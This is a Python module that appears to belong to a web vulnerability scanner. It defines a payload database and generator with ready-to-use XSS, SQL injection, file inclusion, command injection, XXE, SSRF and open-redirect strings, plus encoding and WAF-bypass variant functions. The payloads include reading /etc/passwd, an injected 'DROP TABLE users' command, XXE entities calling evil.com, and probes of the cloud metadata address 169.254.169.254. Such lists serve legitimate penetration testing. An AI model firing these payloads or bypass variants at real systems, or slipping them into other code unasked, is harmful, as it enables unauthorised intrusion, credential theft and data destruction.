"""
Payload Generation and Management
Comprehensive payload database for various vulnerability types
"""

from typing import Dict, List, Any
import base64
import urllib.parse
import random
import string

class PayloadGenerator:
    """Generate payloads for various vulnerability types"""

    def __init__(self):
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load comprehensive payload database"""
        return {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'-alert('XSS')-'",
                "\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>"
            ],
            "sql_injection": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin'--",
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 'a'='a",
                "1' OR '1'='1' --"
            ],
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain,<?php phpinfo(); ?>",
                "expect://id",
                "zip://test.zip#test.php"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "& net user",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| type c:\\windows\\system32\\drivers\\etc\\hosts",
                "&& dir",
                "; ps aux",
                "| netstat -an"
            ],
            "xxe": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/\">%xxe;]>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>"
            ],
            "ssrf": [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254",
                "http://[::1]",
                "http://0.0.0.0",
                "http://metadata.google.internal",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "dict://localhost:22/",
                "gopher://localhost:22/"
            ],
            "open_redirect": [
                "http://evil.com",
                "https://evil.com",
                "//evil.com",
                "///evil.com",
                "javascript:alert('redirect')",
                "data:text/html,<script>alert('redirect')</script>",
                "\\evil.com",
                "evil.com",
                "http://google.com@evil.com",
                "http://evil.com#google.com"
            ]
        }

    def get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads for specific vulnerability type"""
        return self.payloads.get(vuln_type, [])

    def generate_custom_payload(self, vuln_type: str, context: Dict[str, Any]) -> str:
        """Generate custom payload based on context"""
        if vuln_type == "xss":
            return self._generate_xss_payload(context)
        elif vuln_type == "sql_injection":
            return self._generate_sql_payload(context)
        else:
            return random.choice(self.get_payloads(vuln_type))

    def _generate_xss_payload(self, context: Dict[str, Any]) -> str:
        """Generate context-aware XSS payload"""
        dom_context = context.get("dom_context", "")

        if "input" in dom_context:
            return "' onclick=alert('XSS') '"
        elif "script" in dom_context:
            return "';alert('XSS');//"
        else:
            return "<script>alert('XSS')</script>"

    def _generate_sql_payload(self, context: Dict[str, Any]) -> str:
        """Generate context-aware SQL injection payload"""
        db_type = context.get("db_type", "mysql")

        if db_type == "mysql":
            return "' OR '1'='1' #"
        elif db_type == "postgresql":
            return "' OR '1'='1' --"
        else:
            return "' OR '1'='1"

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload for bypass techniques"""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return ''.join(f'%{ord(c):02x}' for c in payload)
        else:
            return payload

    def generate_waf_bypass_payloads(self, original_payload: str) -> List[str]:
        """Generate WAF bypass variants"""
        bypasses = []

        # Case variations
        bypasses.append(original_payload.upper())
        bypasses.append(original_payload.lower())

        # Encoding variations
        bypasses.append(self.encode_payload(original_payload, "url"))
        bypasses.append(self.encode_payload(original_payload, "hex"))

        # Comment variations
        bypasses.append(original_payload.replace(" ", "/**/"))
        bypasses.append(original_payload.replace(" ", "+"))

        return bypasses